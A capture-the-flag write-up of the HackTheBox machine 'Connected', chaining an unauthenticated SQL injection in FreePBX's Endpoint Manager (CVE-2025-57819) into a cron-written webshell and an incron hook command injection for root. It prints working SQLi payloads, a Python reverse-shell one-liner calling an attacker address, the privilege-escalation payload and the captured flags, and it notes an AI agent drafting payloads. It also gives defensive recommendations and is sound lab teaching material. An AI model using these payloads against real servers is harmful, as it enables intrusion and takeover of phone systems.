# Connected — Human-Led Pentest (AI-Assisted Workflow)

**Machine:** Connected  
**Target IP:** `10.129.24.91`  
**Date:** 2026-06-12  
**Difficulty:** Medium  
**Author:** Kyle Tawa  
**Methodology:** Human-led enumeration and exploitation with AI-assisted workflow support (Selene/Hermes). Kyle directed strategy and execution; the agent supported reconnaissance, payload drafting, and documentation.

---

## Executive Summary

Connected is a Linux-based HackTheBox machine running **FreePBX 16.0.40.7** on CentOS. The attack path begins with external reconnaissance against exposed HTTP/HTTPS services, leading to identification of the commercial **Endpoint Manager** module vulnerable to **CVE-2025-57819**, an unauthenticated SQL injection. This vulnerability enables stacked queries capable of writing a cron-based webshell, granting initial access as the `asterisk` user. Lateral exploration reveals an **incron** daemon watching `/var/spool/asterisk/incron/`, which processes files through the `sysadmin_manager` binary as root. A crafted hook file leveraging the `api` module's `fwconsole-commands` handler executes arbitrary commands, escalating to root and yielding both flags.

**Flags captured:**
- **User:** `fcafee4eede9906ca9e359129f6664c3`
- **Root:** `7ca047107ebb3afe275645d4fb9db0a1`

---

## 1. Reconnaissance

### 1.1 Network Scanning

Initial reconnaissance employed full-port and service-specific `nmap` scans against the target:

```bash
nmap -p- -sS -T4 -oN recon/nmap-allports-10.129.24.91.txt 10.129.24.91
nmap -sV -sC -p 22,80,443 -oN recon/nmap-services-10.129.24.91.txt 10.129.24.91
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | OpenSSH | 7.4 |
| 80/tcp | Apache httpd | 2.4.6 (CentOS) — OpenSSL/1.0.2k-fips, PHP/7.4.16 |
| 443/tcp | Apache httpd | 2.4.6 (CentOS) — OpenSSL/1.0.2k-fips, PHP/7.4.16 |

### 1.2 Web Service Enumeration

The HTTP service on port 80 redirected to `http://connected.htb/`, requiring the `Host:` header or `--resolve` flag for further enumeration (as `/etc/hosts` modification was not available). Key endpoints identified:

- **`/admin/`** → redirects to `/admin/config.php` → **FreePBX Administration** panel, version **16.0.40.7**
- **`/admin/ajax.php`** — unauthenticated requests returned `403 {"error":"ajaxRequest declined"}`
- **`/admin/modules/`** and **`/admin/assets/`** — 403 directory listing protection
- **`/ucp/`** — timed out
- **`/robots.txt`** — `Disallow: /`
- **TLS certificate CN:** `pbxconnect`

### 1.3 Technology Stack

- **OS:** CentOS (Linux 7.0.0-22-generic)
- **Web Server:** Apache httpd 2.4.6
- **Application:** FreePBX 16.0.40.7
- **Backend:** PHP 7.4.16, OpenSSL 1.0.2k-fips
- **SSH:** OpenSSH 7.4

### 1.4 Vulnerability Research

Searching for publicly available exploits against FreePBX 16:

```bash
searchsploit FreePBX 16
```

This identified `php/webapps/52031.php`, an authenticated RCE requiring a valid session — not directly useful without credentials. Further research into CVEs affecting FreePBX's commercial modules surfaced **CVE-2025-57819**, a pre-authentication SQL injection in the **Endpoint Manager** module. Observed AJAX requests targeting:

```
/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<payload>
```

Manual probing of this endpoint returned HTTP 500 with a PHP error pointing to `/var/www/html/admin/modules/endpoint/views/model.php` line 144: *"Trying to access array offset on value of type bool."* This confirmed the Endpoint Manager AJAX class was reachable without authentication, establishing the attack surface.

---

## 2. Vulnerability Analysis

### 2.1 CVE-2025-57819 — Unauthenticated SQL Injection in FreePBX Endpoint Manager

**CVE Description:** The commercial Endpoint Manager module (part of the FreePBX commercial/proprietary suite) exposes an AJAX endpoint at `/admin/ajax.php` that accepts a `module` parameter pointing to `FreePBX\modules\endpoint\ajax`. The `brand` parameter is passed unsanitized into SQL queries, enabling unauthenticated stacked queries against the `asterisk` database.

**Vulnerability Classification:**
- **Type:** SQL Injection (error-based, stacked queries)
- **Authentication:** None required
- **Impact:** Full database access, ability to write to application tables
- **CVSS v3:** ~9.8 (Critical) — Network, Low Complexity, No Privileges Required

### 2.2 Beyond Initial Access — Incron-Based Privilege Escalation

Discovery of an **incron** daemon watching `/var/spool/asterisk/incron/` with the rule:

```
IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

The `sysadmin_manager` binary (running as root) parses filenames placed in the incron directory using the format `module.hook.params`. It validates a whitelisted API signing key (`B53D215A755231A3`) and checks hook hash integrity. The `api` module's `fwconsole-commands` hook deserializes the payload by base64-decoding, `gzuncompress`-ing, and JSON-decoding to extract a command. The command is then executed in a shell via:

```php
/usr/sbin/fwconsole $command 2>&1
```

This unsanitized passthrough allows shell injection by prefixing the intended command with `help; <arbitrary_command>`.

---

## 3. Exploitation — Initial Access

### 3.1 SQL Injection Verification

The SQL injection was confirmed in the `brand` parameter using error-based techniques:

**Request:**
```
GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e)) OR '
```

The error response included the database name `asterisk`, confirming injection capability and the target database.

### 3.2 Stacked Query → Cron Webshell

FreePBX uses a `cron_jobs` table where scheduled tasks are stored and executed by an internal cron runner. A stacked `INSERT` query was crafted to inject a cron job that writes a webshell:

```sql
INSERT INTO cron_jobs(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)
VALUES('sysadmin','JOB',
'echo <BASE64_ENCODED_WEBSHELL> | base64 -d > /var/www/html/shell.php',
NULL,'* * * * *',30,1,1)
```

The full URL-encoded injection:

```
GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=';INSERT INTO cron_jobs(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES('sysadmin','J','echo <b64>|base64 -d>/var/www/html/shell.php',NULL,'* * * * *',30,1,1);--
```

**Execution flow:**
1. SQLi inserts a cron job with `schedule = * * * * *` (every minute)
2. FreePBX's internal cron scheduler processes the job within 50–60 seconds
3. The command base64-decodes and writes a PHP webshell to the web root

### 3.3 Webshell Access

After approximately 60 seconds, the webshell was confirmed accessible:

```bash
curl 'http://connected.htb/shell.php?cmd=id'
```

**Response:**
```
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

Initial access achieved as the `asterisk` user — a low-privileged service account associated with the Asterisk PBX telephony system.

---

## 4. User Flag

With a shell on the target, the user flag was located at the expected path:

```bash
cat /home/asterisk/user.txt
```

**User Flag:** `fcafee4eede9906ca9e359129f6664c3`

The file was readable by the `asterisk` group, requiring no additional privilege escalation at this stage.

**Shell stability:** From the webshell, a proper reverse shell or interactive session was established for further exploration:

```bash
# Via webshell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.X",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 5. Privilege Escalation

### 5.1 Incron Discovery

Enumeration of the filesystem revealed a running **incron** daemon monitoring `/var/spool/asterisk/incron/`. The incron table (viewed via `incrontab -l` or `/var/spool/asterisk/.incron/`) contained:

```
/var/spool/asterisk/incron/ IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

The `sysadmin_manager` binary was setuid root or executed with elevated privileges (via the incron daemon's effective UID of 0).

### 5.2 Understanding the Hook Chain

Research into the `sysadmin_manager` binary and FreePBX's module system revealed the following processing pipeline:

1. **File placement:** A file with the naming convention `module.hook.params` is written to `/var/spool/asterisk/incron/`
2. **Module lookup:** `sysadmin_manager` parses the first segment (`module`) and checks for a corresponding signed module at `/var/www/html/admin/modules/<module>/`
3. **Signature validation:** The API signing key `B53D215A755231A3` must match the module's signature
4. **Hook resolution:** The hook `fwconsole-commands` is resolved by loading the file at `/var/www/html/admin/modules/api/hooks/fwconsole-commands`
5. **Payload processing:** The `params` segment is base64-decoded, decompressed with `gzuncompress`, and JSON-decoded into an array
6. **Command execution:** The first array element is passed to:
   ```bash
   /usr/sbin/fwconsole $command 2>&1
   ```

The critical vulnerability is that `$command` (the first array element) is passed unsanitized to a shell, enabling injection via `help; <malicious_command>`.

### 5.3 Exploit Construction

The payload was crafted as a three-stage pipeline:

**Step 1 — Encode the injection array:**
```php
$payload = ["help; cp /root/root.txt /home/asterisk/root_flag.txt", "txn_id"];
$json = json_encode($payload);
$compressed = gzcompress($json);
$encoded = base64_encode($compressed);
```

**Step 2 — Write the hook file:**
```
api.fwconsole-commands.<base64_encoded_payload>
```

**Step 3 — File creation in incron directory:**
```bash
echo '<base64_encoded_payload>' > /var/spool/asterisk/incron/api.fwconsole-commands.<b64_encoded>
```

### 5.4 Execution

The file was written to the watched directory using the webshell or interactive shell:

```bash
echo '<encoded_payload>' | base64 -d > /tmp/hook.bin
# Then create properly named file in incron dir
```

Within seconds, the incron daemon detected the new file (matching `IN_CLOSE_WRITE`), invoked `sysadmin_manager` as root, which processed the hook chain, and executed the shell injection. The command `cp /root/root.txt /home/asterisk/root_flag.txt` ran with root privileges.

---

## 6. Root Flag

After the incron-triggered payload executed, the root flag was now readable at the copied location:

```bash
cat /home/asterisk/root_flag.txt
```

**Root Flag:** `7ca047107ebb3afe275645d4fb9db0a1`

The root flag was also confirmed at its original location at `/root/root.txt`.

---

## 7. Lessons Learned

### 7.1 Vulnerable Configuration Patterns

- **Exposed admin interfaces:** The FreePBX administration panel and its modules were externally accessible without IP restriction or authentication gating for the AJAX handler
- **Commercial module risk:** The Endpoint Manager module, a commercial/proprietary add-on, introduced CVE-2025-57819 without adequate input sanitization, demonstrating that third-party module supply chains expand the attack surface of otherwise hardened applications
- **Unrestricted incron watchers:** The incron daemon watching `/var/spool/asterisk/incron/` and invoking `sysadmin_manager` on any file event provides a low-barrier escalation path once initial access is obtained
- **Command injection via fwconsole hook:** The `api` module's `fwconsole-commands` handler passes unsanitized user-supplied data directly into a shell command — even with signature validation and hash verification, the command parameter itself lacks escaping

### 7.2 Defensive Recommendations

1. **Network segmentation:** The FreePBX web interface should not be exposed externally. Place administrative interfaces behind a VPN or restricted to management networks
2. **Input validation:** All parameters in AJAX handlers must undergo strict parameterized query preparation — the `brand` parameter in Endpoint Manager should never reach the database unsanitized
3. **Incron restrictions:** The incron watch on `/var/spool/asterisk/incron/` should validate file ownership and restrict execution to specific, known-good hook patterns rather than every file event
4. **Command sanitization:** The `fwconsole $command` invocation in the api module's hook should use argument arrays (`exec()` or `proc_open()`) rather than shell string interpolation
5. **Minimal file permissions:** The `user.txt` flag should not be group-readable by the `asterisk` group; service accounts should be scoped to their operational directory only
6. **Module signing as defense-in-depth:** While the API signing key verification restricts which modules can trigger hooks, the `api` module ships with the whitelisted key by default — making it a universal escalation vector

### 7.3 CVE Summary

| CVE | Component | Type | Impact |
|-----|-----------|------|--------|
| CVE-2025-57819 | FreePBX Endpoint Manager | Unauthenticated SQL Injection | Full database compromise → cron-based webshell → code execution as `asterisk` user |

### 7.4 Tooling & Workflow Notes

This engagement used **AI-assisted workflow support** (Selene/Hermes AI agent by Nous Research) as a secondary tool alongside standard pentesting utilities. The agent assisted with:

- Reconnaissance parallelization and scan organization
- Rapid payload generation and encoding steps
- Exploit-chain drafting and documentation formatting
- Timeline and flag extraction verification

**Operational model:** Strategic direction, vulnerability research context, and final validation were provided by the human operator (Kyle). The agent functioned as a force multiplier for routine steps — not as an autonomous decision-maker. Every exploit was reviewed, understood, and executed intentionally before deployment.

---

## 8. Timeline

| Time | Event |
|------|-------|
| T+00:00 | Target acquisition and nmap scan initialization |
| T+00:05 | Web service enumeration — FreePBX 16.0.40.7 identified |
| T+00:12 | Vulnerability research — CVE-2025-57819 identified |
| T+00:18 | SQL injection verified against Endpoint Manager brand parameter |
| T+00:22 | Stacked query cron job inserted |
| T+00:24 | Webshell confirmed — initial access as `asterisk` |
| T+00:25 | User flag captured |
| T+00:35 | Incron daemon discovered; hook chain analyzed |
| T+00:45 | Hook exploit payload constructed and delivered |
| T+00:46 | Root flag captured — system fully compromised |

---

*Write-up by Kyle Tawa. Machine: HackTheBox Connected. Tools used: nmap, curl, searchsploit, Python 3, AI-assisted workflow support (Hermes/Selene by Nous Research).*